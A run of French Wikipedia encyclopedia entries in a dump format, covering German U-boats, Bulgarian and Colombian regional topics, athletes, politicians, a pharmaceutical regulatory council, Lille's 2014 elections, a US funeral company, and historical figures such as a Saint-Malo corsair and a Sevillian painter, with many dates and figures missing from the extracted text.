Le , le U-71 essuie une attaque dans le golfe de Gascogne à l'ouest de Nantes, à la position géographique de par des charges de profondeur lancées d'un bombardier britannique Armstrong Whitworth Whitley (Squadron 502/B). Le U-71 s'en échappe en bon état.
Le à , à environ au large de La Pallice, le U-71 est visé par un avion australien Short S.25 Sunderland (Squadron 10/U), qui lui lance huit grenades sous-marines peu profondes, puis le mitraille à plusieurs reprises. Le U-Boot s'échappe en plongée, et retourne à La Pallice sous escorte d'un Schnellboot. Il est promptement réparé et retrouve la mer le . Deux heures après avoir attaqué le U-71, le Sunderland est lui-même pris à partie par un avion Focke-Wulf Fw 200 Condor (I/KG 40), les deux avions subissant des dégâts. Deux membres de l'équipage du Sunderland sont légèrement blessés.
Le , à , dans l'Atlantique, au sud du Groenland, le U-71 est en observation du convoi "ON-176" quand il est contraint de plonger par les tirs d'un destroyer. Ce dernier lui lance trente-huit grenades sous-marines, qui lui causent des dommages mineurs. Le U-Boot, subissant une plongée d'environ six heures, perd le contact avec le convoi.
Le Unterseeboot 71 a effectué dix patrouilles dans lesquelles il a coulé cinq navires marchands pour un total de et de en mer.
Sa dixième patrouille commence le , quittant Saint-Nazaire, sous les ordres de l'Oberleutnant zur See "Hardo Rodler von Roithberg" et rejoint le port de Königsberg, plus tard le .
Il quitte le service actif le et rejoint le la 24. Unterseebootsflottille à Memel pour servir à l'entraînement des équipages comme navire-école jusqu'au , date à laquelle le U-71 est affecté à la 22. Unterseebootsflottille à Gotenhafen. &lt;br&gt;
Il est désarmé en à Wilhelmshaven.&lt;br&gt; 
Le , en exécution des ordres de l'amiral Karl Dönitz pour l'Opération Regenbogen, le U-71 est sabordé dans la "Raederschleuse" (écluse Raeder (d'après le nom du Grand Amiral Erich Raeder, entrée ouest du port) à Wilhelmshaven, à la position géographique de .
Après guerre, le U-71 est renfloué et démoli.
Patrouilles.
Opérations Wolfpack.
Le U-71 a opéré avec les "Wolfpacks" (meutes de loup) durant sa carrière opérationnelle:
Navires coulés.
Le Unterseeboot 71 a coulé marchands pour un total de au cours des ( en mer) qu'il effectua.

</doc>
<doc id="7278763" url="https://fr.wikipedia.org/wiki?curid=7278763" title="Smolyan (obchtina)">
Smolyan (obchtina)

Smolyan () est une obchtina de l'oblast de Smolyan en Bulgarie.

</doc>
<doc id="7278768" url="https://fr.wikipedia.org/wiki?curid=7278768" title="Drapeau du département de Santander">
Drapeau du département de Santander

Le drapeau du Santander est le principal symbole officiel du département de Santander en Colombie.
Historique.
Il fut adopté en 1972. Il n'est pas le premier drapeau du Santander qui possédait son propre drapeau quand le Santander était un état fédéré des États-Unis de Colombie de 1864 à 1886.
À l'origine, il comportait cinq étoiles, représentant les cinq provinces constitutives du département. De 2004 à 2008, le drapeau comportait huit étoiles symbolisant les huit foyers de développement du département, mais en 2007, il a été décidé de revenir à six étoiles représentant les six actuelles provinces du département.
Description.
Le drapeau du Santander comporte une bande rouge du côté de la hampe contenant six étoiles. La couleur rouge de la bande et son orientation verticale symbolisent la noblesse et l'héroïsme du peuple santandérien. Les six étoiles représentent les provinces du département.
Les bandes vertes symbolisent la loyauté et l'espérance du peuple du Santander, ainsi que la richesse agricole de sa terre. Les bandes or et noire symbolisent elles la richesse de son sous-sol qui a fondé le développement du département au siècle : l'or et le pétrole.

</doc>
<doc id="7278772" url="https://fr.wikipedia.org/wiki?curid=7278772" title="Kléber Berrier">
Kléber Berrier



</doc>
<doc id="7278777" url="https://fr.wikipedia.org/wiki?curid=7278777" title="Unterseeboot 72">
Unterseeboot 72

Unterseeboot 72 ou U-72 est le nom de plusieurs sous-marins allemands ou U-boot durant la Première et la Seconde Guerre mondiale:

</doc>
<doc id="7278778" url="https://fr.wikipedia.org/wiki?curid=7278778" title="Véridique Najean">
Véridique Najean

Véridique Najean est un homme politique français né le à Neufchâteau (Vosges) et décédé le à Neufchâteau (Vosges).
Biographie.
Entré dans l'armée en 1812, il intègre la garde impériale et est blessé à la bataille de Waterloo. Avocat à Neufchâteau, il est un opposant libéral à la Restauration. Conseiller municipal de Neufchâteau et conseiller d'arrondissement, il est député des Vosges de 1848 à 1849, siégeant comme républicain modéré.

</doc>
<doc id="7278779" url="https://fr.wikipedia.org/wiki?curid=7278779" title="U-72">
U-72



</doc>
<doc id="7278781" url="https://fr.wikipedia.org/wiki?curid=7278781" title="Sean Olsson">
Sean Olsson

Sean Nicholas Olsson, né le à Beverley, est un bobeur britannique.
Biographie.
Sean Olsson participe aux Jeux olympiques de 1998 à Nagano, et remporte la médaille de bronze en bob à quatre avec Dean Ward, Courtney Rumbolt et Paul Attwood.

</doc>
<doc id="7278787" url="https://fr.wikipedia.org/wiki?curid=7278787" title="Johann Friedrich Burgmüller">
Johann Friedrich Burgmüller



</doc>
<doc id="7278798" url="https://fr.wikipedia.org/wiki?curid=7278798" title="Modemas">
Modemas



</doc>
<doc id="7278807" url="https://fr.wikipedia.org/wiki?curid=7278807" title="Agnes Randolph">
Agnes Randolph

Agnes Randolph ou Agnès de Dunbar (v. 1312–1369), aussi connue en tant que « Black Agnes » ("Agnès la Noire"), est une comtesse écossaise.
Elle est connue pour avoir défendu le château familial pendant l’absence de son époux, Patrick V, comte de March.
Biographie.
Agnes Randolph est la fille de Thomas Randolph, de Moray, et Isabel Stewart of Bonkyll, elle-même fille de .
Siège du château de Dunbar.
Le siège a lieu dans les contexte d'un conflit lorsque Édouard Balliol, roi d'Écosse de 1332 à 1333, tente de prendre la couronne au roi David II d'Écosse, avec le soutien des Anglais.
Agnes Randolph défend avec succès le château de Dunbar tandis que son époux, Patrick V, comte de March, était parti à la guerre en 1337. Le château a été assiégé par l'Anglais William Montagu du au .

</doc>
<doc id="7278812" url="https://fr.wikipedia.org/wiki?curid=7278812" title="Conseil international d'harmonisation des exigences techniques pour l'enregistrement des médicaments à usage humain">
Conseil international d'harmonisation des exigences techniques pour l'enregistrement des médicaments à usage humain

Le Conseil international d'harmonisation des exigences techniques pour l'enregistrement des médicaments à usage humain (CIH) - en - est une structure internationale qui rassemble les autorités de réglementation et les représentants de l'industrie pharmaceutique d'Europe, du Japon et des États-Unis pour discuter des aspects scientifiques et techniques de l'enregistrement des médicaments.
Depuis sa création en 1990, la CIH a évolué, à travers son Groupe mondial de coopération (en ), pour répondre à la mondialisation du développement des médicaments, de façon que les avantages de l'harmonisation internationale puissent permettre à tous d'accéder à la santé.
La mission de la CIH est de parvenir à l'harmonisation des données et des règlements et de s'assurer ainsi de la sûreté, de la qualité et de l'efficacité des médicaments développés et enregistrés par les différents pays participants.
Histoire.
Dans les années 1980, l'Union européenne a commencé à harmoniser les exigences réglementaires. En 1989, l'Europe, le Japon et les États-Unis ont commencé à créer des plans d'harmonisation : la CIH a été créée en lors d'une réunion à Bruxelles.
Structures.
La CIH comporte six grandes structures :
Le comité de pilotage.
Le comité de pilotage est composé des représentants des entités suivantes :
Ce comité dirige la CIH, détermine les politiques, les procédures, le choix des sujets et le suivi des projets d'harmonisation.
Les coordinateurs.
Les coordonnateurs représentent chaque entité au secrétariat de la CIH.
Le secrétariat.
Le secrétariat est principalement attaché à la préparation et à la documentation des réunions du comité de pilotage ainsi qu'à la coordination des préparatifs des groupes de travail et des réunions des groupes de discussion.
Les groupes de travail.
Les groupes de travail sont créés par le comité de pilotage quand un nouveau sujet est accepté pour l'harmonisation. Ils sont chargés d'élaborer des directives qui répondent aux objectifs énoncés dans le document d'orientation et le suivi du projet.
Coopération globale.
Ce groupe s'occupe des relations avec les autres agences ou groupements de santé ne faisant pas partie du CIH, tels que l'Association des nations de l'Asie du Sud-Est (ASEAN) ou les autorités australiennes, brésiliennes, chinoises, etc.
Procédures.
Le processus de travail de la CIH se décompose en cinq étapes :
Production.
Le MedDRA.
La CIH a produit le dictionnaire médical des affaires réglementaires (MedDRA, pour "Medical Dictionary for Regulatory Activities") qui renferme des termes internationalement reconnus dont l'utilisation facilite la réglementation des produits médicaux destinés aux humains, comme des produits biopharmaceutiques, des matériels médicaux et des vaccins.
Les lignes directrices (en ).
Le CIH émet des lignes directrices dans 4 domaines
Ces lignes directrices font office de recommandations que les laboratoires pharmaceutiques sont tenus de suivre pour le développement ou la fabrication de leurs médicaments.
On compte notamment les lignes directrices majeures suivantes :
Les bonnes pratiques cliniques : ICH E6.
Les bonnes pratiques cliniques (BPC, ou GCP en anglais) ont été révisées par le comité directeur le .
Qualité : ICH Q.
Le CIH édite plusieurs lignes directrices, constituant une base pour les bonnes pratiques de fabrication (BPF, ou GMP en anglais), avec l'ICH Q1 pour la stabilité, ICH Q6 pour les spécifications, ICH Q10 pour le système de qualité pharmaceutique, etc.
Le format CTD.
Le CTD = Common Technical Document est un format de dossier servant à la soumission des demandes d'autorisation de mise sur le marché (AMM) d'un médicament par exemple. Il est géré par l'ICH.

</doc>
<doc id="7278821" url="https://fr.wikipedia.org/wiki?curid=7278821" title="Hopane">
Hopane

L'hopane est un hydrocarbure de formule brute . Il s'agit d'un triterpène pentacyclique donnant son nom à la famille des hopanoïdes, composés organiques présents dans les membranes de nombreuses bactéries, où ils jouent un rôle structurel comparable à celui du cholestérol dans les membranes des eucaryotes.

</doc>
<doc id="7278830" url="https://fr.wikipedia.org/wiki?curid=7278830" title="Salina Olsson">
Salina Olsson

Salina Kristin Olsson, née le à Huddinge, est une footballeuse internationale suédoise évoluant au poste d'attaquant.
Biographie.
Salina Olsson débute au Trångsunds IF avant de rejoindre le Djurgårdens IF Dam. Après avoir évolué dans les catégories de jeunes, elle connaît sa première sélection en équipe de Suède de football féminin le contre l'Islande (victoire 3-1). 
Elle fait partie du groupe participant à la Coupe du monde en 1999 et en 2003 ; elle ne joue néanmoins aucun match. Elle participe par contre à deux matchs des Jeux olympiques d'été de 2004, la Suède terminant quatrième de la compétition. En , elle est transférée au Kopparbergs/Göteborg FC. 
Salina Olsson compte 67 sélections et 17 buts en équipe de Suède.

</doc>
<doc id="7278831" url="https://fr.wikipedia.org/wiki?curid=7278831" title="Unterseeboot 72 (1941)">
Unterseeboot 72 (1941)

Le Unterseeboot 72 (ou U-72) rst un sous-marin (U-Boot) allemand de type VII C de la Kriegsmarine pendant la Seconde Guerre mondiale.
Historique.
Mis en service le , l'U-72 sert sans interruption de sous-marin d'entrainement (navire-école) pour les sous-mariniers, d'abord au sein de la 21. Unterseebootsflottille à Neustadt, puis à partir du dans la 24. Unterseebootsflottille à Trondheim et à partir du , de nouveau à la 21. Unterseebootsflottille.
L'U-72 n'a jamais été opérationnel : il n'a en conséquence effectué aucune patrouille de guerre.
Le , l'U-72 est endommagé à Brême lors d'un bombardement aérien de jour effectué par les forces américaines (USAAF).
Le , pour répondre aux ordres de l'amiral Karl Dönitz donnés dans l'Opération Regenbogen, l'U-72 est sabordé à Bremerhaven.
Après guerre, il est renfloué puis détruit.
Navires coulés.
L'Unterseeboot 72 n'a ni coulé, ni endommagé de navire ennemi, car il n'a pas effectué de patrouille de guerre et a été cantonné à un rôle d'entraînement et de navire-école

</doc>
<doc id="7278838" url="https://fr.wikipedia.org/wiki?curid=7278838" title="Samantha Arsenault">
Samantha Arsenault

Samantha Arsenault, née le à Peabody, est une nageuse américaine.
Biographie.
Aux Jeux olympiques d'été de 2000 à Sydney, Samantha Arsenault est sacrée championne olympique du relais 4x200 mètres nage libre.

</doc>
<doc id="7278851" url="https://fr.wikipedia.org/wiki?curid=7278851" title="Grégoire Chamayou">
Grégoire Chamayou

Grégoire Chamayou, né en 1976, est un philosophe français. 
Biographie.
Chargé de recherche au CNRS, il a été rattaché à l'IHRIM, Institut d'histoire des représentations et des idées dans les modernités (UMR 5317), de l'ENS Lyon. 
Ses thématiques de recherche concernent l’histoire de la philosophie allemande moderne, l’histoire et la philosophie de la médecine et la philosophie politique. Il travaille également sur la dimension éthique de l’usage des drones de combat . 
C'est un ancien élève de l'école normale supérieure de Fontenay-Saint-Cloud.

</doc>
<doc id="7278852" url="https://fr.wikipedia.org/wiki?curid=7278852" title="Cathédrale de la Résurrection de Brest">
Cathédrale de la Résurrection de Brest

La cathédrale de la Résurrection est un édifice religieux orthodoxe à Brest en Biélorussie.
La cathédrale a été construite dans le quartier appelé Vostok en 1995 en l'honneur du jour de la victoire lors de la Seconde Guerre mondiale. C'est le plus grand édifice religieux de la ville de Brest et un des plus grands de la Biélorussie. L'édifice peut accueillir jusqu'à fidèles. Un de ses archiprêtres fut Eugène Parphéniok.
La cathédrale fut consacrée par le patriarche de Moscou et de toute la Russie Alexis II de Moscou, et depuis, des offices religieux y sont tenus régulièrement. En 2001 y fut installée une cloche de .
Durant les années 2011 et 2012, les parties supérieures des coupoles ont été décorées de feuilles d'or au lieu d'argent suivant la tradition orthodoxe en matière d'architecture religieuse. 

</doc>
<doc id="7278853" url="https://fr.wikipedia.org/wiki?curid=7278853" title="Samantha Magee">
Samantha Magee

Samantha Magee (aussi appelée Sam Magee), née le à Hartford, est une rameuse d'aviron américaine.

</doc>
<doc id="7278878" url="https://fr.wikipedia.org/wiki?curid=7278878" title="14 juin 1800">
14 juin 1800

Le est le jour de l'année 1800 du calendrier grégorien. Il s'agit d'un samedi.
13 juin 1800 - "" - 15 juin 1800

</doc>
<doc id="7278919" url="https://fr.wikipedia.org/wiki?curid=7278919" title="Samantha Small">
Samantha Small



</doc>
<doc id="7278985" url="https://fr.wikipedia.org/wiki?curid=7278985" title="Samantha Riley">
Samantha Riley

Samantha Linette Riley, née le à Brisbane, est une nageuse australienne.
Biographie.
Aux Jeux olympiques d'été de 1992 à Barcelone, Samantha Riley est médaillée de bronze sur 100 mètres brasse. En 1996 à Atlanta, elle est médaillée d'argent olympique sur le relais 4 × 100 mètres quatre nages et médaillée de bronze sur 100 mètres brasse.

</doc>
<doc id="7278987" url="https://fr.wikipedia.org/wiki?curid=7278987" title="Almon">
Almon

Almon, dans l’"Énéide", est le nom du personnage dont la mort déclenche la guerre entre les Troyens d'Énée et les Italiques.
Jeune courtisan du roi Latinus, Almon, fils de Tyrrhus (ou Tyrrhée) , avait un cerf domestiqué. L'animal est mortellement blessé par Ascagne lors d'une chasse. Alors, Almon et son père soulèvent les bergers latins contre Ascagne et autres exilés de Troie. Une lutte s'ensuit, pendant laquelle Almon est atteint à la gorge par une flèche, dont il meurt.

</doc>
<doc id="7279002" url="https://fr.wikipedia.org/wiki?curid=7279002" title="Ahmed Fassi Fihri">
Ahmed Fassi Fihri

Ahmed Fassi Fihri né le à Oujda est un ancien haut fonctionnaire de l’administration marocaine et un ancien consultant permanent dans des organisations internationales comme l'UNESCO et la FAO.
Parcours.
Après des formations en sciences administratives et juridiques et en sciences de l’information, Ahmed Fassi Fihri a entamé sa carrière en étant nommé Khalifa détaché à la direction des agents d’autorité et des affaires politiques en 1956 puis chef du secrétariat particulier du ministre de l’intérieur en 1958.
En 1961, il devient chargé d’affaires de l’Ambassade du Royaume du Maroc à Berne en Suisse, chargé principalement des relations avec les organisations internationales installées à Genève particulièrement l’OMS, le BIT et le bureau européen de l’ONU après avoir occupé le poste de chargé de missions au cabinet du ministre des affaires étrangères du Maroc.
En 1963, Ahmed Fassi Fihri obtient le poste de Pacha de la ville de Meknès puis le poste de directeur de cabinet du ministre des affaires de la Mauritanie et du Sahara Marocain en 1965.
Il sera le le directeur fondateur du Centre National de Documentation et en 1974, le directeur fondateur de l’École des sciences de l'information. Enfin, en 1995, il devient directeur fondateur du Centre de Documentation et d’Information Multimedia.
Participation aux Organisations Internationales.
Ahmed Fassi Fihri a été élu membre au conseil du programme général d’information de l’UNESCO puis consultant permanent de l’UNESCO dans les domaines des sciences de l’information.
Il devient également consultant permanent de la FAO (Organisation des Nations unies pour l’alimentation et l’agriculture) en ce qui concerne les systèmes AGRIS et CARIS.
De plus, il est nommé expert permanent du Secrétariat général de la Ligue des États arabes (Centre de documentation et d’information – ALDOC. Tunis, Le Caire EGYPTE) et consultant permanent de l’Organisation arabe pour les sciences administratives en Jordanie.
Publications.
Ahmed Fassi Fihri est l'auteur de plusieurs articles dans différents périodiques nationaux, régionaux et internationaux. La majorité de ces articles concernant la documentologie, bibliothéconomie, archivistique et les sciences de l’information.
De plus il a publié plusieurs études sur demande de certaines organisations arabes, africaines et internationales. La dernière était en faveur de l’ISESCO (l'Organisation islamique pour l'éducation, les sciences et la culture) concernant la création d’un réseau d’information pour les pays islamiques.
Enfin il a participé à toutes les études concernant la création d’un réseau d’information arabe réalisées par le Secrétariat Général de la Ligue des États arabes.
Création de systèmes internationaux de documentation et d’information.
Ahmed Fassi Fihri a participé à la création de quelques système internationaux de documentation et d’information en l’occurrence : 

</doc>
<doc id="7279003" url="https://fr.wikipedia.org/wiki?curid=7279003" title="Forêt d’Othe">
Forêt d’Othe



</doc>
<doc id="7279007" url="https://fr.wikipedia.org/wiki?curid=7279007" title="Shi Tingmao">
Shi Tingmao

Shi Tingmao (chinois : 施廷懋, "Shī Tíngmào"), née le à Chongqing, est une plongeuse chinoise actuellement en activité, double championne olympique sur le tremplin 3 m (en individuel et en synchronisé avec Wu Minxia) aux Jeux olympiques de Rio en 2016. Elle conserve son titre en synchronisé (avec Wang Han) aux Jeux olympiques de 2020
Biographie.
Shi Tingamo remporte aux Jeux asiatiques de 2010 la médaille d'or du plongeon synchronisé à 3 mètres avec Wang Han et la médaille d'argent du plongeon individuel à 3 mètres.
Aux Championnats du monde de natation 2011, Shi Tingmao remporte la médaille d'or du plongeon individuel à 1 mètre. Elle est sacrée championne du monde en plongeon synchronisé à 3 mètres avec Wu Minxia en 2013 et en 2015.

</doc>
<doc id="7279024" url="https://fr.wikipedia.org/wiki?curid=7279024" title="Élections municipales de 2014 à Lille">
Élections municipales de 2014 à Lille

Les élections municipales françaises de 2014 à Lille se sont déroulées les 23 et 30 mars 2014, comme dans les autres communes de France.
Contexte.
Conseil sortant.
Lors des Élections municipales de 2008 à Lille, la liste d'union de la gauche (PS-Les Verts-MoDem-PCF-PRG-MRC) menée par Martine Aubry a obtenu 51 sièges contre 10 à la liste de la majorité présidentielle conduite par Sébastien Huyghe.
Après le départ de l'UMP pour le PRG de Dominique Lemahieu, la majorité municipale s'élève à 52 sièges, contre 9 pour l'opposition.
Candidats et projets.
Jean-René Lecerf (UMP-UDI-MoDem-CNIP).
Jean-René Lecerf, sénateur du Nord est le candidat d'union de l'Union pour un mouvement populaire (UMP), de l'Union des démocrates et indépendants, du Mouvement démocrate (MoDem) et du Centre national des indépendants et paysans.
Hugo Vandamme (Front de gauche).
La liste est menée par Hugo Vandamme, qui a été désigné candidat du Front de gauche par le Parti communiste français, le Parti de gauche, la Gauche unitaire, la Gauche anticapitaliste et la Coordination communiste.
Le projet du Front de gauche s'articule autour de trois principes fondamentaux : , et . Le coût de la vie à Lille est aussi une préoccupation majeure des candidats de la liste, qui communiquent à de nombreuses reprises sur ce thème .
Martine Aubry (PS-PRG-MRC).
Martine Aubry, maire sortante et présidente de Lille Métropole Communauté urbaine se représente pour un troisième mandat, soutenue par le Parti socialiste, le Parti radical de gauche et le Mouvement républicain et citoyen.
Lise Daleux (Europe Écologie Les Verts).
Lise Daleux, , est désignée candidate d'Europe Écologie Les Verts le .

</doc>
<doc id="7279028" url="https://fr.wikipedia.org/wiki?curid=7279028" title="Service Corporation International">
Service Corporation International

Service Corporation International (SCI) est la plus grande entreprise funéraire des États-Unis avec près de 16 % de parts de marché pour ce secteur économique en 2022.
Au 30 juin 2022 SCI possède et exploite 1 459 centres de services funéraires (funérariums) et 488 cimetières (dont 300 sont combinés) dans 44 États américains, 8 provinces canadiennes, le district de Columbia et à Porto Rico.
Histoire.
En 2006, SCI a fusionné avec Alderwoods Group, son concurrent le plus proche en termes de taille. La Federal Trade Commission (FTC) a bloqué la fusion, invoquant des préoccupations concernant le choix des consommateurs. Après avoir accepté de céder des salons funéraires et des cimetières dans plusieurs marchés et de mettre fin aux accords de licence avec d’autres salons funéraires, la FTC a autorisé la poursuite de la fusion. En 2007, l’intégration des sites et des opérations d’Alderwoods était terminée.
En 2009, SCI a soumissionné pour acheter Keystone North America pour 208 millions de dollars américains (263 millions de dollars américains en 2021). L’achat a été complété en 2010 et a ajouté environ 200 emplacements.
En mai 2013, SCI a signé une entente de 1,4 milliard de dollars américains pour l’achat de Stewart Enterprises, la deuxième plus importante entreprise américaine de soins funéraires.
En décembre 2013, la FTC a imposé des conditions à l’acquisition, exigeant que les deux sociétés vendent 53 salons funéraires et 38 cimetières dans 59 marchés locaux, et exigeant que la société fusionnée soit assujettie à une période de dix ans au cours de laquelle la FTC examinera toute tentative de la société d’acquérir des actifs funéraires ou de cimetières dans ces marchés locaux.
Marques.
SCI exploite les marques suivantes aux Etats-Unis et au Canada :

</doc>
<doc id="7279035" url="https://fr.wikipedia.org/wiki?curid=7279035" title="Brahian Peña">
Brahian Peña

Brahian Peña, né le , est un athlète suisse, d'origine dominicaine, spécialiste du 110 m haies.
Le à Rieti, il bat le record national junior en 13 s 31 pour remporter la médaille de bronze des Championnats d'Europe juniors, derrière Wilhem Belocian et Lorenzo Perini.
Le , il porte son record personnel sur les haies hautes à 13 s 73 à Weinheim.

</doc>
<doc id="7279036" url="https://fr.wikipedia.org/wiki?curid=7279036" title="Augustin Clerveaux">
Augustin Clerveaux

Augustin Clerveaux, né vers 1763 à la Marmelade (Saint-Domingue) et mort en 1804 à Dondon (Haïti), est un général français de la révolution française.
États de service.
Ancien libre de couleur, cet officier mulâtre doit sa carrière au général Toussaint Louverture qu’il rallie dès 1793. Il est nommé général de brigade en 1799.
En 1802, il commande le département de Samaná et la lorsqu’il reconnaît l’autorité du gouvernement français et du capitaine-général Leclerc lors de l'expédition de Saint-Domingue. Ce dernier le maintient dans son grade et dans sa fonction.
En 1804, il est l’un des signataires de l’acte d’indépendance d’Haïti, et il est très actif dans le massacre des Français.
Il meurt de la fièvre jaune en 1804 à Dondon, lors de la campagne contre le général Ferrand.
Sources.
 

</doc>
<doc id="7279038" url="https://fr.wikipedia.org/wiki?curid=7279038" title="Métropole de Serrès et Nigrita">
Métropole de Serrès et Nigrita



</doc>
<doc id="7279040" url="https://fr.wikipedia.org/wiki?curid=7279040" title="Ready or Not (Chanson de Bridgit Mendler)">
Ready or Not (Chanson de Bridgit Mendler)

 est le premier single de la chanteuse américaine Bridgit Mendler qui est sorti mondialement le sous le label de Hollywood Records. Ce morceau est le premier single de l'album de Bridgit Mendler sorti le .
Composition.
La chanson de Bridgit Mendler a été comparée à certaines de Cher Lloyd et Carly Rae Jepsen. 
Ce morceau a été écrit par Bridgit Mendler, "Emanuel « Eman » Kiriakou" et "Evan « Kidd » Bogart" ; il a été produit par "Kiriakou".
Clip.
La lyric video est sortie le sur "Mendler's VEVO Channel".
Le clip est sorti le . Le réalisateur est Philip Andelman. Le tournage a eu lieu à Los Angeles.

</doc>
<doc id="7279042" url="https://fr.wikipedia.org/wiki?curid=7279042" title="Augustin Braux">
Augustin Braux

Augustin Braux est un homme politique français né le à Rambervillers (Vosges) et décédé le à Paris.
Avocat, puis propriétaire exploitant, il est député des Vosges de 1848 à 1849, il siège dans la fraction la plus modérée du parti d'Eugène Cavaignac.

</doc>
<doc id="7279043" url="https://fr.wikipedia.org/wiki?curid=7279043" title="Merlito Sabillo">
Merlito Sabillo

Merlito Sabillo est un boxeur philippin né le à Toboso aux Philippines.
Carrière.
Passé professionnel en 2008, il remporte la ceinture de champion du monde des poids pailles WBO laissée vacante par Moises Fuentes le en s'imposant au contre Jorle Estrada. Sabito fait ensuite match nul le face à Carlos Buitrago puis s'incline à la contre Francisco Rodriguez Jr. le .

</doc>
<doc id="7279047" url="https://fr.wikipedia.org/wiki?curid=7279047" title="Unterseeboot 73">
Unterseeboot 73

Unterseeboot 73 ou U-73 est le nom de plusieurs sous-marins allemands ou U-boot durant la Première et la Seconde Guerre mondiale:

</doc>
<doc id="7279048" url="https://fr.wikipedia.org/wiki?curid=7279048" title="Guillaume-Marie Angenard">
Guillaume-Marie Angenard

Guillaume-Marie Angenard, né le à Saint-Malo et mort le à Saint-Servan, est un corsaire français des . 
Biographie.
Dernier né d'une famille modeste de sept enfants, son père Jacques Angenard est un soldat invalide et sa mère Anne-Charlotte de Lisle, une domestique. Ses débuts s'apparentent à ceux de Robert Surcouf. C'est en effet en 1790 qu'il fait ses débuts dans l'océan Indien : négrier sur "Le Bon Ménage" (en compagnie de son frère Denis), la "Peggy", le "Sans-Culotte" (traite illégale), et le "Navigateur", il est corsaire sur le "Cerf" (devenu la "Revanche"), l"'Amphitrite" de François-Thomas Le Même, et le "Va-Tout" avant de rentrer en France sur un navire de l’État, la "Seine", en 1798. 
Au cours de ces neuf années, il exerce à peu près toutes les fonctions possibles à bord d'un bâtiment : construction, intendance, mâture, observation, conduite de l'équipage, etc. Il prend part à quatre combats, dont le dernier sur la "Seine". Il prend part à la capture de onze bâtiments dont celle d'un galion espagnol pris par l"'Amphitrite" près du cap de Bonne-Espérance. Il est fait prisonnier à deux reprises : en 1794 sur la "Revanche" - ce qui lui vaut dix-huit mois de captivité à Calcutta - puis en 1796 sur le "Navigateur", mais il réussit à s'évader à la nage.
Rentré en France, il épouse Jeanne Rendu, une marchande. Le couple habite Saint-Servan où naissent trois garçons et deux filles. Angenard fait la course dans la Manche sur la "Providence" et le "Héros" de René Rosse, ainsi que sur l"'Hirondelle" et l"Aventurier". En 1803, il est nommé capitaine de la "Magdeleine". Entre 1798 et 1803, il participe à cinq combats et à la prise de huit navires dont la "Naïade" capturée à l'abordage. Il est fait prisonnier à trois reprises notamment à l'issue du violent combat entre l"Hirondelle" et le "Télégraphe". Conduit en Angleterre, il vole un bateau de plaisance et débarque à Cherbourg en . Fait prisonnier sur le "Héros", il tente une nouvelle évasion en faisant un trou dans les latrines du ponton anglais. 
Sous le Premier Empire, il repart dans l'océan Indien avec la "Caroline" sous Nicolas Surcouf, qui lui confie la prise le "Fame". Il passe ensuite sur le "Gustave" dont il est le commandant en second. Il prend part à cinq prises et trois combats. Après six mois de captivité à Madras puis en Chine, il est transféré en Angleterre où il reste sur les pontons de 1806 à 1810. Il tente de s'enfuir à six reprises avant de voler un cotre avec lequel il rentre à Port-en-Bessin. Il est capitaine de la "Vénus" en 1810, lieutenant sur la "Miquelonnaise" de Pradère-Niquet en 1812, puis capitaine du "Spéculateur" en 1813. Cinq prises et cinq combats marquent cette période où il est blessé deux fois sur le "Spéculateur". Fait prisonnier sur la "Vénus" et sur le "Spéculateur", il fait encore trois tentatives de fuite dont seule la dernière réussit. 
En une vingtaine d'années d'activité, il présente un bilan exceptionnel : dix-sept combats, vingt-neuf prises et huit années de captivité au total. Il a manqué une dizaine d'évasions mais en a réussies cinq. Il a reçu trois blessures, dont la dernière très grave. Il n'obtient aucune décoration mais bénéficie finalement, en 1820, d'une petite pension pour ses blessures. Après neuf voyages au commerce vers l'Île de France, à partir de 1817, il cesse de naviguer en 1833 et décède quatre ans plus tard.

</doc>
<doc id="7279049" url="https://fr.wikipedia.org/wiki?curid=7279049" title="José del Pozo">
José del Pozo

José del Pozo, né vers 1757 à Séville et mort vers 1821 à Lima, est un peintre espagnol principalement connu pour avoir participé à l'Expédition Malaspina. Il est le fils de María Ximénez et du peintre Pedro del Pozo, un élève de Bernabé Ximénez de Illescas (1613-1671). Pedro del Pozo, en 1775, est nommé directeur de la "Real Escuela de Bellas Artes" de Séville par son ami Francisco de Bruna y Ahumada, membre du Conseil de Castille. Le jeune José del Pozo étudie dans cette école des beaux-arts, puis lorsque son père est assassiné, le , il est nommé concierge le l'institution.
Expédition Malaspina.
En 1789, Alessandro Malaspina, avant de lever l'ancre depuis Cadix, demande à Francisco de Bruna de lui trouver un jeune peintre pour l'accompagner dans son expédition scientifique autour du monde. De Bruna lui recommande José del Pozo qui embarque avec l'expédition le . La première escale a lieu dans le port de Montevideo. Là les peintres de l'expédition réalisent des dessins d'espèces végétales et animales de la région, qui sont actuellement conservés au "Museo Naval de Madrid". Certains sont signés, deux d'entre eux, représentant des plantes, sont de la main de Pozo. Dans le même musée, on trouve un témoignage de l'étape suivante, deux aquarelles de Puerto Deseado, par Pozo. Sans doute les premières peintures réalisées en Argentine et représentant un paysage. Un autre dessin, de Pozo, représente un groupe d'indigènes de Puerto Deseado discutant sur la plage avec des officiers de l'expédition. Il réalise aussi les portraits, de certains de ces autochtones, qui vont être envoyés au roi d'Espagne, depuis le port de Callao. Ce sont ensuite des paysages et des portraits d'habitants de la Patagonie, que réalise Pozo. Les études qu'il réalise sur ces tribus contribuent à dispenser une meilleure connaissance des peuples de la péninsule. Ce sont ensuite le port de Talcahuano, fin , Concepción, le , Valparaíso puis Santiago.
Lima.
Malgré le soutien d'Alejandro Malaspina, pour des raisons assez obscures, José del Pozo est congédié par l'expédition et débarqué dans le port de Callao. Cependant, le nouveau vice-roi du pérou Francisco Gil de Taboada est une connaissance de Pozo, qui décide de rester à Lima plutôt que de rentrer en Espagne. Il fonde une école de peinture et se consacre à la réalisation de portraits des nobles et notables locaux, ainsi que des peintures religieuses, avant sa mort, en 1821, à Lima.

</doc>
<doc id="7279050" url="https://fr.wikipedia.org/wiki?curid=7279050" title="U-73">
U-73



</doc>
<doc id="7279056" url="https://fr.wikipedia.org/wiki?curid=7279056" title="Charles Dumoulin (général)">
Charles Dumoulin (général)

Charles Dumoulin, né le à Limoges et mort le à Strasbourg, est un général français de la Révolution et de l’Empire.
Pendant la Révolution.
Charles Dumoulin naît dans une auberge tenue par ses parents, François Dumoulin et Marie Parjadis, veuve en premières noces de Martial Rouffié. Le baptême a lieu le lendemain, à l'église Saint-Domnolet. Son parrain est son demi-frère, Charles Rouffié, issu de la première union de sa mère. Son père meurt en 1782, alors qu'il a 14 ans. Bon élève, il est remarqué à l'école par le curé de la paroisse. Il suit une formation qui lui permet d'avoir à 17 ans une instruction suffisante pour obtenir un poste de maître d'études à Paris, au Collège de Lisieux.
